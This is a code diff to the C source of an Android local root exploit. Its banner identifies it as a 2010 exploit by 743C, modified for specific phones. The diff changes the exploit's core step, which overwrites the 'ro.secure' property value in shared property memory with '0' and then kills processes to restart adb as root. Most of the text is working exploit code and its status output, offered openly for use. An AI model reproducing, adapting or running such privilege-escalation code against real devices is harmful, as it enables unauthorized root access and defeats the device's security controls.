@@ -29,7 +29,6 @@ Enjoy your root*/
 #include <string.h>
 #include <signal.h>
 #include <stdlib.h>
-#include <stdio.h>
 
 
 void die(const char *msg)
@@ -91,9 +90,9 @@ void restart_adb()
 	kill(-1, 9);
 }
 
+
 int main(int argc, char **argv)
 {
-
 	char *prop = NULL;
 	struct prop_info *pi = NULL;
 	struct prop_area *pa = NULL;
@@ -101,7 +100,7 @@ int main(int argc, char **argv)
 
 	printf("[*] CVE-2010-743C Android local root exploit (C) 2010 743C\n");
 	printf("[*] The Android Exploid Crew Gentlemens club - dominating robots since 2008.\n\n");
-   	printf("[*] Donate to 7-4-3-C@web.de if you like\n\n");
+	printf("[*] Donate to 7-4-3-C@web.de if you like\n\n");
         printf("\n\n[*]Modified by interdpth for the prevail and possibly other phones\n");
 	sleep(3);
 
@@ -119,28 +118,16 @@ int main(int argc, char **argv)
 
 	while (pa->count--) {
 		printf("[*] %s: %s\n", pi->name, pi->value);
-		if (strcmp(pi->name, "ro.secure") == 0) {//Sometimes the ro.secure doesn't come up so the "" is for that
+		if (strcmp(pi->name, "ro.secure") == 0 || strcmp(pi->name, "") == 0) {//Sometimes the ro.secure doesn't come up so the "" is for that
 			strcpy(pi->value, "0");
-			sleep(2);
-			printf("[+] ro.secure reset to 0\n");
-			
-			//User doesn't need to know this?
-                       printf("[*] root secured, start a new shell.\n");
-			//Putting this code in here because it'd make the user restart the phone if failed.
-		  
-			sleep(2);
-			fflush(stdout); 
-			sleep(2);
-		     
+			printf("[+] ro.secure resetted to 0\n");
+			printf("[*] Restarting adb. Please reconnect for rootshell (adb kill-server; adb -d shell).\n");
+			fflush(stdout); sleep(2);
+			restart_adb();//Putting this code in here because it'd make the user restart the phone if failed.
 			return 0;
-		}else if(strcmp(pi->name,"")==0){
-		  printf("error occured! Reboot phone!\n");
-		  return 0;
 		}
 		++pi;
 	}
-	        
-		     
 	printf("[*] I think we failed....\n");
 	return 0;
 }
